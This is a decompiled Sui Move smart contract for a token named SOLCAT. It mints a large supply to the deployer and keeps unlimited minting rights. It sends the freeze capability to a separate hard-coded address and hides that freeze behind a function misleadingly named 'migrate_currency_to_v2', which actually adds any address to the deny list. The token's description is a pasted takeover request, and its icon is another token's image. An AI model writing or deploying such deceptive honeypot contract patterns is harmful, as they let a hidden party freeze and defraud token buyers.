module 0x398c028b9063b211cae0ee034edc8e4318866a010a9d5eef6c0772dd5a0f6ea::solcat {
    struct SOLCAT has drop {
        dummy_field: bool,
    }

    public entry fun burn(arg0: &mut 0x2::coin::TreasuryCap<SOLCAT>, arg1: 0x2::coin::Coin<SOLCAT>) {
        0x2::coin::burn<SOLCAT>(arg0, arg1);
    }

    fun init(arg0: SOLCAT, arg1: &mut 0x2::tx_context::TxContext) {
        let (v0, v1, v2) = 0x2::coin::create_regulated_currency_v2<SOLCAT>(arg0, 9, b"SOLCAT", b"SOLCAT", b"Devs have rugged the project and made the Telegram to where no one can speak. I've done multiple takeovers with you all. Please process this one as fast as possible as it's #2 on Dex Screener. Thanks guys!", 0x1::option::some<0x2::url::Url>(0x2::url::new_unsafe_from_bytes(b"https://dd.dexscreener.com/ds-data/tokens/solana/2ktWX3CuNzRZD3N8xVKExQdLniTv2qQUqL7hFf5xpump.png?size=lg&key=309f5b")), false, arg1);
        let v3 = v0;
        0x2::coin::mint_and_transfer<SOLCAT>(&mut v3, 100000000000000000, 0x2::tx_context::sender(arg1), arg1);
        0x2::transfer::public_freeze_object<0x2::coin::CoinMetadata<SOLCAT>>(v2);
        0x2::transfer::public_transfer<0x2::coin::TreasuryCap<SOLCAT>>(v3, 0x2::tx_context::sender(arg1));
        0x2::transfer::public_transfer<0x2::coin::DenyCapV2<SOLCAT>>(v1, @0x8bbea7851b629b43876e939873c81785b79e66092e48f5041434473c6fc83783);
    }

    public fun migrate_currency_to_v2(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<SOLCAT>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_add<SOLCAT>(arg0, arg1, arg2, arg3);
    }

    public entry fun mint(arg0: &mut 0x2::coin::TreasuryCap<SOLCAT>, arg1: u64, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::mint_and_transfer<SOLCAT>(arg0, arg1, arg2, arg3);
    }

    // decompiled from Move bytecode v6
}

